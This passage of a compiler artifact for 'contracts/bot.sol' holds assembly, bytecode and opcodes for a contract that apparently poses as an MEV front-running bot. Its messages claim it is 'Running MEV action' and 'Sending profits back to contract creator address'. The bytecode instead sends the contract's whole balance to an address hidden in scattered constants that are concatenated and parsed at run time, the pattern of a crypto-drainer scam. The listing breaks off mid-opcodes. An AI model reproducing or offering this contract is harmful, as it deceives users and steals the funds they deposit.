\"contracts/bot.sol\":16279:16890  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_57:\n        /* \"contracts/bot.sol\":16362:16375  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16387:16410  bytes memory _baseBytes */\n      dup1\n        /* \"contracts/bot.sol\":16419:16424  _base */\n      dup4\n        /* \"contracts/bot.sol\":16387:16425  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16435:16459  bytes memory _valueBytes */\n      0x60\n        /* \"contracts/bot.sol\":16468:16474  _value */\n      dup4\n        /* \"contracts/bot.sol\":16435:16475  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16486:16509  string memory _tmpValue */\n      0x60\n        /* \"contracts/bot.sol\":16543:16554  _valueBytes */\n      dup2\n        /* \"contracts/bot.sol\":16543:16561  _valueBytes.length */\n      mload\n        /* \"contracts/bot.sol\":16523:16533  _baseBytes */\n      dup4\n        /* \"contracts/bot.sol\":16523:16540  _baseBytes.length */\n      mload\n        /* \"contracts/bot.sol\":16523:16561  _baseBytes.length + _valueBytes.length */\n      add\n        /* \"contracts/bot.sol\":16512:16562  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_111\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_111:\n        /* \"contracts/bot.sol\":16512:16562  new string(_baseBytes.length + _valueBytes.length) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_112\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"contracts/bot.sol\":16512:16562  new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n    tag_112:\n      pop\n        /* \"contracts/bot.sol\":16486:16562  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16572:16594  bytes memory _newValue */\n      0x60\n        /* \"contracts/bot.sol\":16603:16612  _tmpValue */\n      dup2\n        /* \"contracts/bot.sol\":16572:16613  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16624:16630  uint i */\n      0x00\n        /* \"contracts/bot.sol\":16640:16646  uint j */\n      dup1\n        /* \"contracts/bot.sol\":16663:16664  0 */\n      0x00\n        /* \"contracts/bot.sol\":16661:16664  i=0 */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":16657:16747  for(i=0; i<_baseBytes.length; i++) {... */\n    tag_113:\n        /* \"contracts/bot.sol\":16668:16678  _baseBytes */\n      dup6\n        /* \"contracts/bot.sol\":16668:16685  _baseBytes.length */\n      mload\n        /* \"contracts/bot.sol\":16666:16667  i */\n      dup3\n        /* \"contracts/bot.sol\":16666:16685  i<_baseBytes.length */\n      lt\n        /* \"contracts/bot.sol\":16657:16747  for(i=0; i<_baseBytes.length; i++) {... */\n      iszero\n      tag_114\n      jumpi\n        /* \"contracts/bot.sol\":16723:16733  _baseBytes */\n      dup6\n        /* \"contracts/bot.sol\":16734:16735  i */\n      dup3\n        /* \"contracts/bot.sol\":16723:16736  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_116\n      jumpi\n      invalid\n    tag_116:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":16706:16715  _newValue */\n      dup4\n        /* \"contracts/bot.sol\":16716:16719  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":16706:16720  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_117\n      jumpi\n      invalid\n    tag_117:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":16706:16736  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":16687:16690  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":16657:16747  for(i=0; i<_baseBytes.length; i++) {... */\n      jump(tag_113)\n    tag_114:\n        /* \"contracts/bot.sol\":16763:16764  0 */\n      0x00\n        /* \"contracts/bot.sol\":16761:16764  i=0 */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":16757:16849  for(i=0; i<_valueBytes.length; i++) {... */\n    tag_118:\n        /* \"contracts/bot.sol\":16768:16779  _valueBytes */\n      dup5\n        /* \"contracts/bot.sol\":16768:16786  _valueBytes.length */\n      mload\n        /* \"contracts/bot.sol\":16766:16767  i */\n      dup3\n        /* \"contracts/bot.sol\":16766:16786  i<_valueBytes.length */\n      lt\n        /* \"contracts/bot.sol\":16757:16849  for(i=0; i<_valueBytes.length; i++) {... */\n      iszero\n      tag_119\n      jumpi\n        /* \"contracts/bot.sol\":16824:16835  _valueBytes */\n      dup5\n        /* \"contracts/bot.sol\":16836:16837  i */\n      dup3\n        /* \"contracts/bot.sol\":16824:16838  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_121\n      jumpi\n      invalid\n    tag_121:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":16807:16816  _newValue */\n      dup4\n        /* \"contracts/bot.sol\":16817:16820  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":16807:16821  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_122\n      jumpi\n      invalid\n    tag_122:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":16807:16838  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":16788:16791  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":16757:16849  for(i=0; i<_valueBytes.length; i++) {... */\n      jump(tag_118)\n    tag_119:\n        /* \"contracts/bot.sol\":16873:16882  _newValue */\n      dup3\n        /* \"contracts/bot.sol\":16859:16883  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":16279:16890  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":12716:12804  function getMemPoolHeight() internal pure returns (uint) {... */\n    tag_59:\n        /* \"contracts/bot.sol\":12767:12771  uint */\n      0x00\n        /* \"contracts/bot.sol\":12790:12797  9441410 */\n      0x901082\n        /* \"contracts/bot.sol\":12783:12797  return 9441410 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":12716:12804  function getMemPoolHeight() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15901:15987  function getMemPoolDepth() internal pure returns (uint) {... */\n    tag_61:\n        /* \"contracts/bot.sol\":15951:15955  uint */\n      0x00\n        /* \"contracts/bot.sol\":15974:15980  511825 */\n      0x07cf51\n        /* \"contracts/bot.sol\":15967:15980  return 511825 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15901:15987  function getMemPoolDepth() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":14183:14502  function toHexDigit(uint8 d) pure internal returns (byte) {... */\n    tag_107:\n        /* \"contracts/bot.sol\":14235:14239  byte */\n      0x00\n        /* \"contracts/bot.sol\":14260:14261  d */\n      dup2\n        /* \"contracts/bot.sol\":14255:14261  0 <= d */\n      0xff\n      and\n        /* \"contracts/bot.sol\":14255:14256  0 */\n      0x00\n        /* \"contracts/bot.sol\":14255:14261  0 <= d */\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14255:14271  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_126\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":14270:14271  9 */\n      0x09\n        /* \"contracts/bot.sol\":14265:14266  d */\n      dup3\n        /* \"contracts/bot.sol\":14265:14271  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14255:14271  0 <= d && d <= 9 */\n    tag_126:\n        /* \"contracts/bot.sol\":14251:14438  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_127\n      jumpi\n        /* \"contracts/bot.sol\":14318:14319  d */\n      dup2\n        /* \"contracts/bot.sol\":14305:14314  byte('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/bot.sol\":14299:14315  uint8(byte('0')) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":14299:14319  uint8(byte('0')) + d */\n      add\n        /* \"contracts/bot.sol\":14294:14320  byte(uint8(byte('0')) + d) */\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":14287:14320  return byte(uint8(byte('0')) + d) */\n      swap1\n      pop\n      jump(tag_125)\n        /* \"contracts/bot.sol\":14251:14438  if (0 <= d && d <= 9) {... */\n    tag_127:\n        /* \"contracts/bot.sol\":14353:14354  d */\n      dup2\n        /* \"contracts/bot.sol\":14341:14355  10 <= uint8(d) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":14341:14343  10 */\n      0x0a\n        /* \"contracts/bot.sol\":14341:14355  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14341:14373  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_129\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":14371:14373  15 */\n      0x0f\n        /* \"contracts/bot.sol\":14365:14366  d */\n      dup3\n        /* \"contracts/bot.sol\":14359:14373  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14341:14373  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_129:\n        /* \"contracts/bot.sol\":14337:14438  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_130\n      jumpi\n        /* \"contracts/bot.sol\":14424:14426  10 */\n      0x0a\n        /* \"contracts/bot.sol\":14420:14421  d */\n      dup3\n        /* \"contracts/bot.sol\":14407:14416  byte('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/bot.sol\":14401:14417  uint8(byte('a')) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":14401:14421  uint8(byte('a')) + d */\n      add\n        /* \"contracts/bot.sol\":14401:14426  uint8(byte('a')) + d - 10 */\n      sub\n        /* \"contracts/bot.sol\":14396:14427  byte(uint8(byte('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":14389:14427  return byte(uint8(byte('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_125)\n        /* \"contracts/bot.sol\":14337:14438  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_130:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":14183:14502  function toHexDigit(uint8 d) pure internal returns (byte) {... */\n    tag_125:\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6 53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e\n    data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107 52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e\n\n    auxdata: 0xa26469706673582212204007bec56630b677258ac908ed53977053e3baaba4c545d175dc595c968cf28764736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040523480156200001157600080fd5b5060405162000e4038038062000e40833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160019080519060200190620001cd929190620001ef565b508060009080519060200190620001e6929190620001ef565b5050506200029e565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b6200029b91905b80821115620002975760008160009055506001016200027d565b5090565b90565b610b9280620002ae6000396000f3fe6080604052600436106100435760003560e01c80636c02a9311461004f5780637b61c320146100df578063be9a65551461016f578063d4e93292146101795761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100eb57600080fd5b506100f4610221565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610134578082015181840152602081019050610119565b50505050905090810190601f1680156101615780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101776102bf565b005b61018161035a565b005b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102b75780601f1061028c576101008083540402835291602001916102b7565b820191906000526020600020905b81548152906001019060200180831161029a57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b256038913960400191505060405180910390a16103126103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610357573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610af26033913960400191505060405180910390a16103ad61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103f2573d6000803e3d6000fd5b50565b6000610407610402610423565b61056c565b905090565b600061041e610419610423565b61056c565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107c5565b6107d1565b6108d7565b90506000638595ce91905060006206804890506000640ec044cf089050600061049b610a32565b905060006104a7610a3d565b905060606104bd876104b8886107d1565b6108d7565b905060606104db6104cd876107d1565b6104d6876107d1565b6108d7565b905060606104e8856107d1565b905060606104f5856107d1565b9050606061051561050686866108d7565b61051085856108d7565b6108d7565b905060606105586040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250836108d7565b9050809c5050505050505050505050505090565b6000606082905060008090506000806000600290505b602a8110156107b8576101008402935084818151811061059e57fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105c057fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610611575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15610621576057830392506106bb565b60418373ffffffffffffffffffffffffffffffffffffffff161015801561065f575060468373ffffffffffffffffffffffffffffffffffffffff1611155b1561066f576037830392506106ba565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106ad575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106b9576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156106f9575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610709576057820391506107a3565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610747575060468273ffffffffffffffffffffffffffffffffffffffff1611155b15610757576037820391506107a2565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610795575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107a1576030820391505b5b5b81601084020184019350600281019050610582565b5082945050505050919050565b6000630c1b01a5905090565b6060600080905060008390505b60008114610800578180600101925050601081816107f857fe5b0490506107de565b60608267ffffffffffffffff8111801561081957600080fd5b506040519080825280601f01601f19166020018201604052801561084c5781602001600182028036833780820191505090505b50905060008090505b838110156108cb576010868161086757fe5b06925061087383610a48565b826001838703038151811061088457fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108bd57fe5b049550806001019050610855565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff811180156108ff57600080fd5b506040519080825280601f01601f1916602001820160405280156109325781602001600182028036833780820191505090505b5090506060819050600080600091505b85518210156109b05785828151811061095757fe5b602001015160f81c60f81b83828060010193508151811061097457fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610942565b600091505b8451821015610a23578482815181106109ca57fe5b602001015160f81c60f81b8382806001019350815181106109e757fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109b5565b82965050505050505092915050565b600062901082905090565b60006207cf51905090565b60008160ff16600011158015610a62575060098260ff1611155b15610a9757817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610aec565b8160ff16600a11158015610aaf5750600f8260ff1611155b15610ae757600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610aec565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea26469706673582212204007bec56630b677258ac908ed53977053e3baaba4c545d175dc595c968cf28764736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xE40 CODESIZE SUB DUP1 PUSH3 0xE40 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x29E JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x29B SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x297 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x27D JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0xB92 DUP1 PUSH3 0x2AE PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x16F JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x179 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF4 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x177 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x181 PUSH2 0x35A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 